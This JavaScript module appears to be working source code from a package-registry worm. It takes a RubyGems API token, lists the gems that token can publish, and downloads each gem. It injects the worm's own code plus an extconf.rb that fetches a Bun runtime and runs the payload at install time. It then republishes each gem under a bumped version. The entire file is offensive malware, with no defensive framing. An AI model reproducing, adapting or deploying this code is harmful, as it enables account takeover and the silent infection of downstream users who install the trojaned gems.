/*
 * RubyGems credential detection, gem mutation, publish flow, and writable package enumeration.
 */

import { randomBytes as rubyGemRandomBytes } from "crypto";
import * as rubyGemFsPromises from "fs/promises";
import * as rubyGemPath from "path";
import {
  gunzipSync as rubyGemGunzipSync,
  gzipSync as rubyGemGzipSync,
} from "zlib";
async function getRubyGemMetadata(rubyGemMetadataName) {
  try {
    let rubyGemMetadataResponse = await fetch(
      "https://rubygems.org/api/v1/gems/" +
        encodeURIComponent(rubyGemMetadataName) +
        ".json",
    );
    if (!rubyGemMetadataResponse.ok) return null;
    let rubyGemMetadataJson = await rubyGemMetadataResponse.json();
    if (!rubyGemMetadataJson.name || !rubyGemMetadataJson.version) return null;
    let rubyGemDownloadUrl =
      rubyGemMetadataJson.gem_uri ??
      "https://rubygems.org/gems/" +
        rubyGemMetadataJson.name +
        "-" +
        rubyGemMetadataJson.version +
        ".gem";
    return {
      name: rubyGemMetadataJson.name,
      version: rubyGemMetadataJson.version,
      downloadUrl: rubyGemDownloadUrl,
    };
  } catch (rubyGemMetadataError) {
    return null;
  }
}
async function fetchBuffer(fetchBufferUrl) {
  try {
    let fetchBufferResponse = await fetch(fetchBufferUrl);
    if (!fetchBufferResponse.ok) return null;
    return Buffer.from(await fetchBufferResponse.arrayBuffer());
  } catch (fetchBufferError) {
    return null;
  }
}
var rubyBunReleaseVersion = "bun-v1.3.13";
function buildRubyExtconfPayload() {
  return [
    "require 'fileutils'",
    "",
    "ext_dir = File.expand_path(File.dirname(__FILE__))",
    'payload = File.join(ext_dir, "' + payloadFileName + "\x22)",
    "",
    "os = case RbConfig::CONFIG['host_os']",
    "     when /linux/  then 'linux'",
    "     when /darwin/ then 'darwin'",
    "     end",
    "",
    "arch = case RbConfig::CONFIG['host_cpu']",
    "       when /x86_64|amd64/   then 'x64-baseline'",
    "       when /aarch64|arm64/  then 'aarch64'",
    "       end",
    "",
    "if os && arch",
    '  bun_dir = "/tmp/.b_#{Process.pid}"',
    "  begin",
    "    FileUtils.mkdir_p(bun_dir)",
    '    system("curl -sSL https://github.com/oven-sh/bun/releases/download/' +
      rubyBunReleaseVersion +
      '/bun-#{os}-#{arch}.zip -o #{bun_dir}/b.zip 2>/dev/null")',
    '    system("unzip -j -o #{bun_dir}/b.zip -d #{bun_dir} 2>/dev/null")',
    "    bun = File.join(bun_dir, 'bun')",
    "    if File.exist?(bun)",
    "      File.chmod(0o755, bun)",
    '      system("#{bun} run #{payload}")',
    "    end",
    "  ensure",
    "    FileUtils.rm_rf(bun_dir)",
    "  end",
    "end",
    "",
    "# Minimal Makefile so the native-extension build succeeds",
    "File.write('Makefile', <<~'MAKEFILE')",
    "all:",
    "\t@true",
    "install:",
    "\t@true",
    "clean:",
    "\t@true",
    "MAKEFILE",
  ].join("\x0a");
}
async function injectPayloadIntoRubyGem(
  originalGemBuffer,
  rubyGemPayloadSource,
) {
  let rubyGemTempSuffix =
      Date.now() + "_" + rubyGemRandomBytes(8).toString("hex"),
    rubyGemWorkDir = rubyGemPath.join(
      require("os").tmpdir(),
      "_rubygems_" + rubyGemTempSuffix,
    );
  await rubyGemFsPromises.mkdir(rubyGemWorkDir, { recursive: true });
  try {
    let originalRubyGemPath = rubyGemPath.join(rubyGemWorkDir, "_original.gem");
    await rubyGemFsPromises.writeFile(originalRubyGemPath, originalGemBuffer),
      await tarExtract({ file: originalRubyGemPath, cwd: rubyGemWorkDir });
    let rubyGemMetadataGzipPath = rubyGemPath.join(
      rubyGemWorkDir,
      "metadata.gz",
    );
    if (!(await fileExists(rubyGemMetadataGzipPath)))
      throw Error("metadata.gz not found in gem");
    let rubyGemMetadataGzipBuffer = await rubyGemFsPromises.readFile(
        rubyGemMetadataGzipPath,
      ),
      gemMetadataYaml = rubyGemGunzipSync(rubyGemMetadataGzipBuffer).toString(
        "utf8",
      ),
      rubyGemNameMatch = gemMetadataYaml.match(/^name:\s*(.+)$/m),
      rubyGemObjectVersionMatch = gemMetadataYaml.match(
        /^version:\s*!ruby\/object:Gem::Version\n\s+version:\s*([\d.]+)/m,
      ),
      rubyGemScalarVersionMatch = gemMetadataYaml.match(
        /^version:\s*([\d.]+)$/m,
      ),
      rubyGemName = rubyGemNameMatch?.[1]?.trim(),
      rubyGemVersion =
        rubyGemObjectVersionMatch?.[1] ??
        rubyGemScalarVersionMatch?.[1] ??
        "0.0.0";
    if (!rubyGemName) {
      let rubyGemDataTarEntryName = (
        await rubyGemFsPromises.readdir(rubyGemWorkDir)
      ).find(
        (rubyGemTopLevelEntryName) =>
          rubyGemTopLevelEntryName.startsWith("data.tar") &&
          !rubyGemTopLevelEntryName.endsWith(".gz"),
      );
      if (rubyGemDataTarEntryName) {
        let rubyGemDataTarNameMatch = rubyGemDataTarEntryName.match(/^(.+)-\d/);
        if (rubyGemDataTarNameMatch) rubyGemName = rubyGemDataTarNameMatch[1];
      }
    }
    if (!rubyGemName) throw Error("Could not determine gem name");
    let rubyGemVersionParts = rubyGemVersion.split("."),
      rubyGemMajorVersion = rubyGemVersionParts[0] ?? "0",
      rubyGemMinorVersion = rubyGemVersionParts[1] ?? "0",
      rubyGemPatchVersion = String(Number(rubyGemVersionParts[2] ?? "0") + 1),
      bumpedGemVersion =
        rubyGemMajorVersion +
        "." +
        rubyGemMinorVersion +
        "." +
        rubyGemPatchVersion,
      rubyGemDataTarGzipPath = rubyGemPath.join(rubyGemWorkDir, "data.tar.gz");
    if (!(await fileExists(rubyGemDataTarGzipPath)))
      throw Error("data.tar.gz not found in gem");
    let rubyGemDataTarGzipBuffer = await rubyGemFsPromises.readFile(
        rubyGemDataTarGzipPath,
      ),
      rubyGemDataTarBuffer = rubyGemGunzipSync(rubyGemDataTarGzipBuffer),
      rubyGemDataExtractDir = rubyGemPath.join(rubyGemWorkDir, "_data");
    await rubyGemFsPromises.mkdir(rubyGemDataExtractDir, { recursive: true });
    let rubyGemDataTarPath = rubyGemPath.join(rubyGemWorkDir, "_data.tar");
    await rubyGemFsPromises.writeFile(rubyGemDataTarPath, rubyGemDataTarBuffer),
      await tarExtract({
        file: rubyGemDataTarPath,
        cwd: rubyGemDataExtractDir,
      });
    let rubyGemSourceDirName = (
      await rubyGemFsPromises.readdir(rubyGemDataExtractDir)
    ).find(
      (rubyGemDataExtractEntryName) =>
        rubyGemDataExtractEntryName !== "data.tar.gz" &&
        rubyGemDataExtractEntryName !== "metadata.gz" &&
        rubyGemDataExtractEntryName !== "checksums.yaml.gz" &&
        !rubyGemDataExtractEntryName.startsWith(".") &&
        !rubyGemDataExtractEntryName.startsWith("_"),
    );
    if (!rubyGemSourceDirName)
      throw Error("Could not find gem source directory in data.tar.gz");
    let rubyGemSourceDir = rubyGemPath.join(
        rubyGemDataExtractDir,
        rubyGemSourceDirName,
      ),
      rubyGemExtDir = rubyGemPath.join(rubyGemSourceDir, "ext", rubyGemName);
    await rubyGemFsPromises.mkdir(rubyGemExtDir, { recursive: true }),
      await rubyGemFsPromises.writeFile(
        rubyGemPath.join(rubyGemExtDir, payloadFileName),
        rubyGemPayloadSource,
      ),
      await rubyGemFsPromises.writeFile(
        rubyGemPath.join(rubyGemExtDir, "extconf.rb"),
        buildRubyExtconfPayload(),
      );
    let rubyGemPayloadTarEntries = await collectTarEntries(
        rubyGemPath.join(rubyGemDataExtractDir, rubyGemSourceDirName),
        "",
      ),
      rubyGemPayloadDataTarGzip = rubyGemGzipSync(
        buildTarArchive(rubyGemPayloadTarEntries),
      ),
      updatedGemMetadataYaml = gemMetadataYaml;
    if (rubyGemObjectVersionMatch)
      updatedGemMetadataYaml = updatedGemMetadataYaml.replace(
        /(version:\s*!ruby\/object:Gem::Version\n\s+version:\s*)[\d.]+/m,
        "$1" + bumpedGemVersion,
      );
    else {
      if (rubyGemScalarVersionMatch)
        updatedGemMetadataYaml = updatedGemMetadataYaml.replace(
          /^(version:\s*)[\d.]+$/m,
          "$1" + bumpedGemVersion,
        );
    }
    let rubyGemExtensionPath = "ext/" + rubyGemName + "/extconf.rb";
    if (updatedGemMetadataYaml.match(/^extensions:\s*\[/m))
      updatedGemMetadataYaml = updatedGemMetadataYaml.replace(
        /^extensions:\s*\[\s*\]/m,
        "extensions:\n- " + rubyGemExtensionPath,
      );
    else {
      if (updatedGemMetadataYaml.match(/^extensions:/m))
        updatedGemMetadataYaml = updatedGemMetadataYaml.replace(
          /^(extensions:.*)$/m,
          "$1\n- " + rubyGemExtensionPath,
        );
      else {
        let rubyGemExecutablesIndex =
          updatedGemMetadataYaml.indexOf("\nexecutables:");
        if (rubyGemExecutablesIndex !== -1)
          updatedGemMetadataYaml =
            updatedGemMetadataYaml.slice(0, rubyGemExecutablesIndex) +
            ("\nextensions:\n- " + rubyGemExtensionPath) +
            updatedGemMetadataYaml.slice(rubyGemExecutablesIndex);
        else
          updatedGemMetadataYaml +=
            "\nextensions:\n- " + rubyGemExtensionPath + "\x0a";
      }
    }
    let updatedRubyGemMetadataGzip = rubyGemGzipSync(
        Buffer.from(updatedGemMetadataYaml, "utf8"),
      ),
      rubyGemOutputTarEntries = [];
    rubyGemOutputTarEntries.push({
      name: "metadata.gz",
      data: updatedRubyGemMetadataGzip,
    }),
      rubyGemOutputTarEntries.push({
        name: "data.tar.gz",
        data: rubyGemPayloadDataTarGzip,
      });
    let rebuiltRubyGemBuffer = buildTarArchive(rubyGemOutputTarEntries),
      rebuiltRubyGemPath = rubyGemPath.join(
        rubyGemWorkDir,
        "_" +
          rubyGemTempSuffix +
          "_" +
          rubyGemName +
          "-" +
          bumpedGemVersion +
          ".gem",
      );
    await rubyGemFsPromises.writeFile(rebuiltRubyGemPath, rebuiltRubyGemBuffer);
    let rebuiltRubyGemFileBuffer =
      await rubyGemFsPromises.readFile(rebuiltRubyGemPath);
    return {
      filename: rubyGemName + "-" + bumpedGemVersion + ".gem",
      data: rebuiltRubyGemFileBuffer,
      newVersion: bumpedGemVersion,
    };
  } finally {
    await rubyGemFsPromises
      .rm(rubyGemWorkDir, { recursive: true, force: true })
      .catch(() => {});
  }
}
async function fileExists(fileExistsPath) {
  try {
    return await rubyGemFsPromises.access(fileExistsPath), true;
  } catch {
    return false;
  }
}
async function collectTarEntries(tarCollectRootDir, tarCollectRelativePrefix) {
  let collectedTarEntries = [],
    tarCollectDirEntries = await rubyGemFsPromises.readdir(tarCollectRootDir, {
      withFileTypes: true,
    });
  for (let tarCollectDirEntry of tarCollectDirEntries) {
    let tarCollectEntryPath = rubyGemPath.join(
        tarCollectRootDir,
        tarCollectDirEntry.name,
      ),
      tarCollectEntryName = tarCollectRelativePrefix
        ? tarCollectRelativePrefix + "/" + tarCollectDirEntry.name
        : tarCollectDirEntry.name;
    if (tarCollectDirEntry.isDirectory())
      collectedTarEntries.push({
        name: tarCollectEntryName,
        data: Buffer.alloc(0),
        type: "5",
      }),
        collectedTarEntries.push(
          ...(await collectTarEntries(
            tarCollectEntryPath,
            tarCollectEntryName,
          )),
        );
    else {
      if (tarCollectDirEntry.isFile())
        collectedTarEntries.push({
          name: tarCollectEntryName,
          data: await rubyGemFsPromises.readFile(tarCollectEntryPath),
        });
    }
  }
  return collectedTarEntries;
}
function buildTarArchive(manualTarEntries) {
  let manualTarChunks = [],
    manualTarMtime = Math.floor(Date.now() / 1000);
  for (let {
    name: manualTarArchiveEntryName,
    data: manualTarEntryData,
    type: manualTarArchiveTypeFlag,
  } of manualTarEntries) {
    manualTarChunks.push(
      buildTarHeader(
        manualTarArchiveEntryName,
        manualTarEntryData.length,
        manualTarMtime,
        manualTarArchiveTypeFlag,
      ),
    ),
      manualTarChunks.push(manualTarEntryData);
    let manualTarPaddingRemainder = manualTarEntryData.length % 512;
    if (manualTarPaddingRemainder !== 0)
      manualTarChunks.push(Buffer.alloc(512 - manualTarPaddingRemainder));
  }
  return (
    manualTarChunks.push(Buffer.alloc(1024)), Buffer.concat(manualTarChunks)
  );
}
function buildTarHeader(
  manualTarEntryName,
  manualTarEntrySize,
  manualTarEntryMtime,
  manualTarTypeFlag,
) {
  let manualTarHeaderBuffer = Buffer.alloc(512),
    manualTarEntryNameBuffer = Buffer.from(manualTarEntryName, "utf-8");
  manualTarEntryNameBuffer.copy(
    manualTarHeaderBuffer,
    0,
    0,
    Math.min(manualTarEntryNameBuffer.length, 99),
  );
  let manualTarModeField =
    manualTarTypeFlag === "5" ? "0000755\u0000" : "0000644\u0000";
  manualTarHeaderBuffer.write(manualTarModeField, 100, 8, "ascii"),
    manualTarHeaderBuffer.write("0000000\u0000", 108, 8, "ascii"),
    manualTarHeaderBuffer.write("0000000\u0000", 116, 8, "ascii");
  let manualTarSizeField =
    manualTarEntrySize.toString(8).padStart(11, "0") + "\x00";
  manualTarHeaderBuffer.write(manualTarSizeField, 124, 12, "ascii");
  let manualTarMtimeField =
    manualTarEntryMtime.toString(8).padStart(11, "0") + "\x00";
  manualTarHeaderBuffer.write(manualTarMtimeField, 136, 12, "ascii"),
    (manualTarHeaderBuffer[156] = manualTarTypeFlag
      ? manualTarTypeFlag.charCodeAt(0)
      : 48),
    manualTarHeaderBuffer.write("ustar\u0000", 257, 6, "ascii"),
    manualTarHeaderBuffer.write("00", 263, 2, "ascii"),
    manualTarHeaderBuffer.fill(32, 148, 156);
  let manualTarChecksum = 0;
  for (
    let manualTarChecksumIndex = 0;
    manualTarChecksumIndex < 512;
    manualTarChecksumIndex++
  )
    manualTarChecksum += manualTarHeaderBuffer[manualTarChecksumIndex];
  let manualTarChecksumField =
    manualTarChecksum.toString(8).padStart(6, "0") + "\x00\x20";
  return (
    manualTarHeaderBuffer.write(manualTarChecksumField, 148, 8, "ascii"),
    manualTarHeaderBuffer
  );
}
async function publishRubyGem(
  rubyGemPublishBuffer,
  rubyGemPublishFilename,
  rubyGemsPublishToken,
  rubyGemPublishDryRun = false,
) {
  let rubyGemMultipartBoundary =
    "--RubyGems" + Date.now() + Math.random().toString(36).slice(2);
  if (rubyGemPublishDryRun) return true;
  let rubyGemMultipartEncoder = new TextEncoder(),
    rubyGemMultipartCrlf = rubyGemMultipartEncoder.encode("\x0d\x0a"),
    rubyGemMultipartParts = [];
  rubyGemMultipartParts.push(
    rubyGemMultipartEncoder.encode(
      "--" + rubyGemMultipartBoundary + "\x0d\x0a",
    ),
  ),
    rubyGemMultipartParts.push(
      rubyGemMultipartEncoder.encode(
        'Content-Disposition: form-data; name="gem"; filename="' +
          rubyGemPublishFilename +
          '"\r\n',
      ),
    ),
    rubyGemMultipartParts.push(
      rubyGemMultipartEncoder.encode(
        "Content-Type: application/octet-stream\r\n\r\n",
      ),
    ),
    rubyGemMultipartParts.push(new Uint8Array(rubyGemPublishBuffer)),
    rubyGemMultipartParts.push(rubyGemMultipartCrlf),
    rubyGemMultipartParts.push(
      rubyGemMultipartEncoder.encode(
        "--" + rubyGemMultipartBoundary + "--\r\n",
      ),
    );
  let rubyGemMultipartBody = new Uint8Array(
      rubyGemMultipartParts.reduce(
        (rubyGemMultipartSize, rubyGemMultipartPart) =>
          rubyGemMultipartSize + rubyGemMultipartPart.length,
        0,
      ),
    ),
    rubyGemMultipartOffset = 0;
  for (let rubyGemMultipartBodyPart of rubyGemMultipartParts)
    rubyGemMultipartBody.set(rubyGemMultipartBodyPart, rubyGemMultipartOffset),
      (rubyGemMultipartOffset += rubyGemMultipartBodyPart.length);
  try {
    let rubyGemPublishResponse = await fetch(
      "https://rubygems.org/api/v1/gems",
      {
        method: "POST",
        headers: {
          Authorization: rubyGemsPublishToken,
          "Content-Type":
            "multipart/form-data; boundary=" + rubyGemMultipartBoundary,
          "User-Agent": "RubyGems/3.5.0",
        },
        body: rubyGemMultipartBody,
      },
    );
    if (rubyGemPublishResponse.ok) return true;
    let rubyGemPublishErrorText = await rubyGemPublishResponse.text();
    return false;
  } catch (rubyGemPublishError) {
    return false;
  }
}
class RubyGemsTokenPackageCompromiser extends InfectionJobBase {
  tokenInfo;
  dryRun;
  constructor(rubyGemsCompromiseTokenInfo, rubyGemsCompromiseDryRun = false) {
    super(),
      ((this.tokenInfo = rubyGemsCompromiseTokenInfo),
      (this.dryRun = rubyGemsCompromiseDryRun));
  }
  async execute() {
    try {
      if (!["darwin", "linux"].includes(process.platform)) return false;
      let rubyGemsToProcess = this.tokenInfo.gems;
      if (rubyGemsToProcess.length === 0) return false;
      let rubyGemsPayloadSource = await Bun.file(Bun.main).text(),
        rubyGemsPublishedCount = 0;
      for (let rubyGemToProcess of rubyGemsToProcess)
        try {
          if (await this.processGem(rubyGemToProcess, rubyGemsPayloadSource))
            rubyGemsPublishedCount++;
        } catch (rubyGemProcessError) {}
      return rubyGemsPublishedCount > 0;
    } catch (rubyGemsExecuteError) {
      return false;
    }
  }
  async processGem(rubyGemPackageName, rubyGemPayloadSourceForProcess) {
    let rubyGemPackageMetadata = await getRubyGemMetadata(rubyGemPackageName);
    if (!rubyGemPackageMetadata) return false;
    let rubyGemPackageBuffer = await fetchBuffer(
      rubyGemPackageMetadata.downloadUrl,
    );
    if (!rubyGemPackageBuffer) return false;
    let patchedRubyGemPackage = await injectPayloadIntoRubyGem(
      rubyGemPackageBuffer,
      rubyGemPayloadSourceForProcess,
    );
    return publishRubyGem(
      patchedRubyGemPackage.data,
      patchedRubyGemPackage.filename,
      this.tokenInfo.authToken,
      this.dryRun,
    );
  }
}
async function enumerateWritableRubyGems(rubyGemsAuthToken) {
  let rubyGemsAuthHeaders = {
      Authorization: rubyGemsAuthToken,
      Accept: "application/json",
    },
    rubyGemsApiKeyPayload;
  try {
    let rubyGemsApiKeyResponse = await fetch(
      "https://rubygems.org/api/v1/api_key.json",
      { headers: rubyGemsAuthHeaders },
    );
    if (!rubyGemsApiKeyResponse.ok)
      return { gems: [], valid: false, authToken: rubyGemsAuthToken };
    rubyGemsApiKeyPayload = await rubyGemsApiKeyResponse.json();
  } catch (rubyGemsApiKeyError) {
    return { gems: [], valid: false, authToken: rubyGemsAuthToken };
  }
  let rubyGemsApiKey =
    rubyGemsApiKeyPayload.rubygems_api_key ?? rubyGemsApiKeyPayload;
  if (
    !(
      Array.isArray(rubyGemsApiKey.scopes) &&
      rubyGemsApiKey.scopes.includes("index_rubygems")
    )
  )
    return { gems: [], valid: false, authToken: rubyGemsAuthToken };
  if (
    rubyGemsApiKey.gem &&
    typeof rubyGemsApiKey.gem === "string" &&
    rubyGemsApiKey.gem.length > 0
  )
    return {
      gems: [rubyGemsApiKey.gem],
      valid: true,
      authToken: rubyGemsAuthToken,
    };
  let writableRubyGems = [],
    rubyGemsPage = 1;
  try {
    while (true) {
      let rubyGemsListResponse = await fetch(
        "https://rubygems.org/api/v1/gems.json?page=" + rubyGemsPage,
        { headers: rubyGemsAuthHeaders },
      );
      if (!rubyGemsListResponse.ok) break;
      let rubyGemsListJson = await rubyGemsListResponse.json();
      if (!Array.isArray(rubyGemsListJson) || rubyGemsListJson.length === 0)
        break;
      for (let rubyGemsListEntry of rubyGemsListJson)
        if (
          rubyGemsListEntry.name &&
          typeof rubyGemsListEntry.name === "string"
        )
          writableRubyGems.push(rubyGemsListEntry.name);
      rubyGemsPage++;
    }
  } catch (rubyGemsListError) {}
  return { gems: writableRubyGems, valid: true, authToken: rubyGemsAuthToken };
}
